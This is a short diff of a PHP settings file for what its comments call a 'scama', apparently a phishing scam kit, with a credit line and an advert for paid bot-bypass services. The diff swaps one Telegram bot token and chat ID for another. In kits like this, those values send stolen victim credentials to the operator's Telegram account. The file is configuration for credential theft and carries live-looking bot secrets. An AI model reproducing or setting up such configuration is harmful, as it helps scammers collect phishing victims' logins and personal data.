@@ -21,7 +21,7 @@
 // setting scama
 // License Auth By SCHT
 // Jasa Bypass Bot PM sini @Aditya_anugrah
-$botToken="5698128399:AAG8qebm-3E1QvDxzTrW84TY1-5gTnxkzTc";
-$chatId="1827521422";
+$botToken="5511546605:AAEgnvLAI4GLvdwl82KN8UU0XskndmMjA7E";
+$chatId="5332528640";
 
 ?>
